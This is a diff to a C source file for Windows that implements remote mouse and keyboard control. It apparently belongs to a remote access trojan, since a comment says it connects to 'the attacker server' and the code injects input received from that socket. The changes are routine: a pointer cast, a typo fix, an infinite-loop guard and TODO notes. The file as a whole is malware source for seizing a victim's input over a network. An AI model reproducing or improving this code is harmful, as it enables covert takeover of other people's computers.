@@ -1,9 +1,21 @@
 /*
-This source file consists of functions for controlling the mouse and keyboard
+Functions for controlling the mouse and keyboard
 */
 
 #include "inputs.h"
 #include "utils.h"
+
+// Global socket used to receive commands for input control
+// TODO - change this to local varibale?
+SOCKET inputSocket;
+// Global handle used to keep track of input control thread
+HANDLE inputThreadHandle;
+/*
+Globals used to keep track of whether the keyboard and mouse are being controlled
+If both of these are set to 0, the input thread stops and the socket is closed
+*/
+int keyboardControlled = 0;
+int mouseControlled = 0;
 
 /*
 Assigns the values of an INPUT structure based on a mouse input to simulate
@@ -38,7 +50,7 @@ int buildMouseInput(char* buffer, int idx, PINPUT in) {
 		}
 	} else if (cmd == MOUSE_POS) { // set mouse position
 		in->mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE;
-		int* ref = &buffer[idx + 1];
+		int* ref = (int*)(&buffer[idx + 1]);
 		in->mi.dx = ntohl(ref[0]);
 		in->mi.dy = ntohl(ref[1]);
 		return 9;
@@ -160,7 +172,7 @@ void sendInputStream(char* buffer) {
 	
 	// make sure the buffer starts correctly
 	if (buffer[0] != START_INPUTS) {
-		printf("Input stream starts with unexted value: %d\n", buffer[0]);
+		printf("Input stream starts with unexpected value: %d\n", buffer[0]);
 		return;
 	}
 
@@ -196,6 +208,11 @@ void sendInputStream(char* buffer) {
 		if (buffer[idx + 1] == START_INPUTS) {
 			idx += 2; } // move idx to start of next input stream
 	}
+
+	// debug info
+	if (idx == prev) {
+		printf("Prevented an infinite loop!");
+	}
 }
 
 /*
@@ -217,6 +234,10 @@ DWORD WINAPI inputThreadFunc(void* data) {
 	// main loop
 	while (mouseControlled == 1 || keyboardControlled == 1) {
 		// get data from the socket and check the return value
+		// TODO - change this up maybe???
+		//		read single byte to get command type
+		//		then from command type, read arg bytes
+		//		SendInputStream() would then handle only one input at a time
 		retCode = recv(inputSocket, buffer, 4096, 0);
 		if (retCode == 0) { // connection closed
 			printf("Input control socket closed...\n");
@@ -226,6 +247,7 @@ DWORD WINAPI inputThreadFunc(void* data) {
 			break;
 		}
 		// if we got this far, we have a valid message to process
+		// TODO - change this up maybe??? see 'TODO' note at recv() call
 		sendInputStream(buffer);
 	}
 	// reset mouseControlled and keyboardControlled in case we broke out of the loop from an error
@@ -263,7 +285,7 @@ void startInputThread() {
 	if (exitCode == STILL_ACTIVE) {
 		return; }
 	// try connecting to the attacker server
-	if(connectToTCP(SERVER_ADDR, SERVER_INPUT_PORT, inputSocket)) {
+	if(connectToTCP(SERVER_ADDR, SERVER_INPUT_PORT, &inputSocket)) {
 		mouseControlled = 0; // reset mouse and keyboard control
 		keyboardControlled = 0;
 		return; // return to avoid creating more problems
